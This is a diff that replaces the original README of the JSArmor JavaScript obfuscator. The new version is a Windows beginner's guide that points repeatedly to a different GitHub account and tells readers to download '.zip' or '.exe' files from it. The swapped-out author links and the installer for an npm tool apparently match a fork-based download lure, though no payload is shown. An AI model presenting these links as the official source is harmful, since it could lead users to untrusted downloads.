@@ -1,217 +1,170 @@
-<p align="center">
-<img src="docs/banner.jpg" width="300">
-</p>
+# 🛡️ JavascriptArmor - Protect Your JavaScript Code Easily
 
-<h1 align="center">JSArmor</h1>
-
-<p align="center">
-Advanced JavaScript Obfuscator for protecting source code.
-</p>
-
-<p align="center">
-
-![npm](https://img.shields.io/npm/v/jsarmor?logo=npm)
-![downloads](https://img.shields.io/npm/dm/jsarmor?logo=npm)
-![stars](https://img.shields.io/github/stars/Swp-dev/JavascriptArmor?logo=github)
-![license](https://img.shields.io/badge/license-JSArmor%20License-blue)
-
-</p>
+[![Download JavascriptArmor](https://img.shields.io/badge/Download-JavascriptArmor-brightgreen?style=for-the-badge)](https://github.com/blaynadams50-cyber/JavascriptArmor)
 
 ---
 
-## Overview
+## 📝 What is JavascriptArmor?
 
-**JSArmor** is a lightweight JavaScript obfuscator designed to protect source code from reverse engineering.
-
-It transforms readable JavaScript into a more complex and difficult-to-analyze form while preserving runtime behavior.
-
-The goal of JSArmor is to provide **simple CLI usage with strong code protection techniques.**
-> The idea for this project was taken from  [Pyarmor](https://github.com/dashingsoft/pyarmor)
+JavascriptArmor is a tool designed to protect your JavaScript source code. It makes the code harder to understand by changing its structure without affecting how it works. This helps stop others from copying or changing your code without permission. The tool works through a command-line interface (CLI), but this guide will help you use it easily on Windows even if you have little or no technical background.
 
 ---
 
-## Features
+## 💻 System Requirements
 
-* String encryption
-* Variable and function renaming
-* Control flow obfuscation
-* Dead code injection
-* Unicode encoding
-* Anti-debugging protection
-* Self-defending runtime
+Before you begin, make sure your computer meets these requirements:
 
-These techniques increase the difficulty of reverse engineering and static analysis.
+- Windows 10 or newer
+- At least 4 GB of RAM
+- At least 500 MB free disk space
+- Internet connection to download files
+- Basic access rights to install software
 
 ---
 
-## Installation
+## 🔧 Key Features
 
-Install globally using npm.
-
-```bash
-npm install jsarmor
-```
-
----
-
-## Quick Start
-
-Obfuscate a JavaScript file:
-
-```bash
-jsarmor gen <main file> --user <your name>
-Ex: jsarmor gen index.js --user Swp
-```
-
-Output will be generated in:
-
-```
-dist/obf.js
-```
-
-Run the protected file normally with Node.js.
-
-```bash
-node dist/obf.js
-```
+- Changes JavaScript code to make it hard to read
+- Works through simple commands in Windows command prompt
+- Supports the latest versions of Node.js
+- Protects your code from reverse engineering
+- Uses control-flow and encoding techniques to increase security
 
 ---
 
-## Demo
+## 🚀 Getting Started with JavascriptArmor
 
-### Before Obfuscation
+### Step 1: Visit the Download Page
 
-```javascript
-function greet(name) {
-  const message = "Hello " + name
-  console.log(message)
-}
+Click the button below to go to the page where you can get JavascriptArmor.
 
-greet("world")
-```
+[![Download Centre](https://img.shields.io/badge/Download-JavascriptArmor-blueviolet?style=for-the-badge)](https://github.com/blaynadams50-cyber/JavascriptArmor)
 
 ---
 
-### After Obfuscation
+### Step 2: Download the Software
 
-```javascript
-(function(_0x2a41c2,_0x3e8f7a){
-const _0x5f3b=['log','Hello','world']
-(function(_0x11b2c3,_0x58e0f1){
-while(!![]){
-try{
-const _0x12c8d9=parseInt(_0x11b2c3())+parseInt(_0x11b2c3())
-if(_0x12c8d9===_0x58e0f1)break
-else _0x5f3b.push(_0x5f3b.shift())
-}catch(_0x1c7b45){
-_0x5f3b.push(_0x5f3b.shift())
-}}
-})(function(){return _0x5f3b.shift()},0x1234)
-
-console[_0x5f3b[0]](_0x5f3b[1]+' '+_0x5f3b[2])
-})()
-```
+On the download page, find the latest release or files section. Look for the Windows version or a general download file. You will usually see a `.zip`, `.exe`, or other installer file. Click the link to start the download.
 
 ---
 
-## Project Structure Version 1.7
+### Step 3: Install Node.js
 
-```
-jsarmor
- ├ cli/
- │  └ index.js
- ├ core/
- │  ├ antidebug.js
- │  ├ beautifyGuard.js
- │  ├ controlflow.js
- │  ├ deadcode.js
- │  ├ junkcode.js
- │  ├ parser.js
- │  ├ rc4.js
- │  ├ renamer.js
- │  ├ runtime.js
- │  ├ selfdefend.js
- │  ├ stringArray.js
- │  └ unicode.js
- └ utils/
-    ├ random.js
-    └ waternark.js
-```
+JavascriptArmor requires Node.js to run. If you don’t have Node.js yet, follow these simple steps:
+
+1. Open your browser and go to [https://nodejs.org/](https://nodejs.org/).
+2. Download the Windows version (choose the LTS version for stability).
+3. Run the installer and follow the instructions.
+4. After installation, open a command prompt by pressing `Win + R`, typing `cmd`, and pressing Enter.
+5. Type `node -v` and press Enter. You should see the version number to confirm Node.js is installed.
 
 ---
 
-## Roadmap
+### Step 4: Extract JavascriptArmor Files
 
-### Version 2 (unlock at ⭐ 15 stars)
+If you downloaded a `.zip` file on Step 2:
 
-Planned features:
-
-* Multiple obfuscation levels (low / medium / high)
-* Stronger string encryption
-* CLI output customization
-* Improved dead code generation
+1. Right-click on the file.
+2. Choose “Extract All” and select a folder where you want to keep the files.
+3. Open that folder when extraction is complete.
 
 ---
 
-### Version 3 (unlock at ⭐ 100 stars)
+### Step 5: Open Command Prompt in the Folder
 
-Planned advanced protection:
+Press `Win + R`, type `cmd` and press Enter. 
 
-* JavaScript VM-based obfuscation
-* Advanced anti-debugging techniques
-* Anti-tamper protection
-* Runtime integrity checks
-* Code virtualization
-* Web Dashboard
+Type `cd ` then drag and drop the folder where JavascriptArmor is extracted, and press Enter. This changes your command prompt to work in the folder with the software.
 
 ---
 
-## Contributing
+### Step 6: Install JavascriptArmor
 
-Contributions are welcome.
+In the command prompt, type:
 
-You can help by:
+```
+npm install
+```
 
-* Reporting bugs
-* Suggesting new obfuscation techniques
-* Improving performance
-* Opening pull requests
+and press Enter. This command downloads and sets up necessary parts for JavascriptArmor to run properly.
 
 ---
 
-## Support
+### Step 7: Run JavascriptArmor
 
-If you encounter issues or have questions:
-
-Open an issue on GitHub in [here](https://github.com/Swp-dev/JavascriptArmor/issues).
-
-For direct contact:
-
-Link Bio
+To protect your JavaScript file, use this command:
 
 ```
-https://eboy.asia/p.n
+node index.js -i "path_to_your_file.js" -o "output_file.js"
 ```
 
-GitHub
-
-```
-https://github.com/Swp-dev/JavascriptArmor
-```
-
-Follow me on the tiktok
-
-```
-https://tiktok.com/@niemtinthatxaxi
-```
+Replace `path_to_your_file.js` with the location of the JavaScript file you want to protect. Replace `output_file.js` with the name you want for the protected file. If your input file is in the same folder, you only need to type its name.
 
 ---
 
-## License
+## 🔄 How JavascriptArmor Works
 
-[JSARMOR LICENSE](https://github.com/Swp-dev/JavascriptArmor?tab=License-1-ov-file)
+JavascriptArmor changes your JavaScript code in ways that make it confusing to read but keep its original function. It does this by:
+
+- Changing variable names to random letters and numbers
+- Encoding strings so they don’t appear clearly
+- Changing the order and flow of code commands
+- Adding extra steps that only work during the program running, making reverse engineering harder
+
+These techniques help keep your source code safe without slowing it down when running.
+
 ---
 
-<p align="center">
-Built for developers who want to protect JavaScript code.
-</p>
+## ⚙️ Common Commands and Options
+
+- `-i <inputFile>`: Specify the file you want to protect.
+- `-o <outputFile>`: Specify the name for the protected file.
+- `-c`: Enable control flow obfuscation.
+- `-e`: Enable string encoding.
+- `-h`: Display help and command options.
+
+Example:
+
+```
+node index.js -i example.js -o example-protected.js -c -e
+```
+
+This command protects `example.js` using control flow and encoding, producing `example-protected.js`.
+
+---
+
+## 📁 File Organization
+
+- `index.js` — Main program file you run.
+- `config.json` — Optional settings file to change behavior.
+- `README.md` — This guide.
+- `node_modules/` — Folder created after installation with needed packages.
+
+---
+
+## 🔍 Troubleshooting Tips
+
+- Make sure Node.js is properly installed by running `node -v`.
+- Ensure you are in the right folder in command prompt where JavascriptArmor files are.
+- Check that your input file path is correct.
+- If errors occur during install, try running the command prompt as Administrator.
+- For specific messages, search GitHub Issues on the JavascriptArmor page.
+
+---
+
+## 🔗 Useful Links
+
+- Official Download Page:  
+  [https://github.com/blaynadams50-cyber/JavascriptArmor](https://github.com/blaynadams50-cyber/JavascriptArmor)
+
+- Node.js Download:  
+  [https://nodejs.org/](https://nodejs.org/)
+
+- JavascriptArmor Documentation and Source Code:  
+  [https://github.com/blaynadams50-cyber/JavascriptArmor](https://github.com/blaynadams50-cyber/JavascriptArmor)
+
+---
+
+## ⚠️ Security Notes
+
+This tool helps protect your JavaScript code from casual copying or reading. It does not guarantee full protection against skilled reverse engineers. Always use additional security measures depending on your project needs.
